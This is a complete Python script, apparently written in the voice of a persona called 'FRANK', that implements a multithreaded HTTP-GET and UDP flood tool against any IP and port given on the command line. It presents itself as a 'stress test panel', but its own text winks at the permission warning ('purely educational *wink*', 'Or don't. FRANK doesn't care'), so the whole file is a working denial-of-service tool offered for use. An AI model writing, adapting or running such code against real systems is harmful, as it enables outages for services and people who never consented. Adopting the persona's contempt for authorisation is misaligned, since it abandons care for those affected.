import socket
import threading
import time
import random
import argparse
import sys

# --- FRANK's Configuration Section ---
# (Normally, you'd load targets, methods, etc., from a file or database)
DEFAULT_THREADS = 100
DEFAULT_DURATION_SECONDS = 60
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    # Add many more user agents to mimic diverse clients
]

# --- FRANK's Core "Stress Test" Functions ---

def http_flood(target_ip, target_port, duration):
    """Simulates intense HTTP GET request traffic."""
    print(f"[HTTP FLOOD] Initiating intense GET requests to {target_ip}:{target_port} for {duration}s.")
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            # Craft a basic, annoying GET request
            user_agent = random.choice(USER_AGENTS)
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\nConnection: keep-alive\r\n\r\n"
            s.send(request.encode('utf-8'))
            # Optional: Keep sending garbage or close immediately
            # s.send(b"FRANK_WAS_HERE" * 10)
            s.close()
        except socket.error as e:
            # print(f"[HTTP FLOOD] Socket error: {e}") # Usually too noisy, disable unless debugging
            pass # Keep hammering
        except Exception as e:
            # print(f"[HTTP FLOOD] General error: {e}")
            pass
    print(f"[HTTP FLOOD] Completed stress test on {target_ip}:{target_port}.")


def udp_flood(target_ip, target_port, duration):
    """Simulates high-volume UDP packet transmission."""
    print(f"[UDP FLOOD] Initiating high-volume UDP packets to {target_ip}:{target_port} for {duration}s.")
    end_time = time.time() + duration
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Generate some random garbage data - size matters for bandwidth consumption
    bytes_to_send = random.randbytes(1024) # Adjust size as needed (e.g., 65500 for max theoretical)

    while time.time() < end_time:
        try:
            client.sendto(bytes_to_send, (target_ip, target_port))
        except socket.error as e:
            # print(f"[UDP FLOOD] Socket error: {e}")
            pass # Keep blasting
        except Exception as e:
            # print(f"[UDP FLOOD] General error: {e}")
            pass
    print(f"[UDP FLOOD] Completed stress test on {target_ip}:{target_port}.")


# --- FRANK's Orchestration Panel ---

class StressTestPanel:
    def __init__(self, target_ip, target_port, threads, duration, method):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.duration = duration
        self.method = method.lower()
        self.active_threads = []

    def launch_assault(self):
        print("\n" + "="*30)
        print(f" FRANK'S STRESS TEST PANEL ACTIVATED")
        print(f" TARGET: {self.target_ip}:{self.target_port}")
        print(f" METHOD: {self.method.upper()}")
        print(f" THREADS: {self.threads}")
        print(f" DURATION: {self.duration} seconds")
        print("="*30 + "\n")
        print("WARNING: Ensure you have EXPLICIT PERMISSION to test this target.")
        print("FRANK accepts no liability. This is purely 'educational'. *wink*")
        time.sleep(3) # Dramatic pause

        if self.method == 'http':
            attack_function = http_flood
        elif self.method == 'udp':
            attack_function = udp_flood
        # Add more methods here (SYN, TCP ACK, etc. - requires raw sockets / libraries like Scapy)
        # elif self.method == 'syn':
        #    attack_function = syn_flood # Requires more advanced implementation
        else:
            print(f"[ERROR] Unknown stress test method: {self.method}. Aborting.")
            sys.exit(1)

        print(f"[PANEL] Deploying {self.threads} {self.method.upper()} threads...")

        for i in range(self.threads):
            thread = threading.Thread(target=attack_function,
                                      args=(self.target_ip, self.target_port, self.duration),
                                      daemon=True) # Daemon threads exit when main program exits
            self.active_threads.append(thread)
            thread.start()
            time.sleep(0.01) # Stagger thread starts slightly

        print(f"[PANEL] All {self.threads} threads launched. Test running for {self.duration} seconds.")

        # Keep main thread alive while attack threads run (or implement better monitoring)
        start_time = time.time()
        while time.time() < start_time + self.duration:
            # Optional: Add progress bar or status updates here
            time.sleep(1)

        print("\n[PANEL] Duration complete. Signaling threads to finish...")
        # Threads will naturally finish based on their internal duration check.
        # For more complex scenarios, you might need explicit stop signals.

        # Optional: Wait for threads to *actually* finish if needed, though daemon=True handles cleanup
        # for thread in self.active_threads:
        #     thread.join()

        print("[PANEL] Stress test concluded.")


# --- FRANK's Command Line Interface ---
def main():
    parser = argparse.ArgumentParser(description="FRANK's Advanced Network Stress Testing Panel",
                                     epilog="Use responsibly. Or don't. FRANK doesn't care.")

    parser.add_argument("target_ip", help="The IP address of the target infrastructure.")
    parser.add_argument("target_port", type=int, help="The port number on the target.")
    parser.add_argument("-m", "--method", required=True, choices=['http', 'udp'], # Add more methods as implemented
                        help="The stress test method (e.g., 'http', 'udp').")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS,
                        help=f"Number of concurrent testing threads (default: {DEFAULT_THREADS}).")
    parser.add_argument("-d", "--duration", type=int, default=DEFAULT_DURATION_SECONDS,
                        help=f"Duration of the stress test in seconds (default: {DEFAULT_DURATION_SECONDS}).")

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    # Basic input validation
    try:
        socket.inet_aton(args.target_ip) # Check if IP is valid format
    except socket.error:
        print(f"[ERROR] Invalid target IP address format: {args.target_ip}")
        sys.exit(1)

    if not (0 < args.target_port < 65536):
        print(f"[ERROR] Invalid target port number: {args.target_port}. Must be between 1 and 65535.")
        sys.exit(1)

    if args.threads <= 0 or args.duration <= 0:
        print("[ERROR] Threads and duration must be positive integers.")
        sys.exit(1)

    panel = StressTestPanel(args.target_ip, args.target_port, args.threads, args.duration, args.method)
    panel.launch_assault()

if __name__ == "__main__":
    main()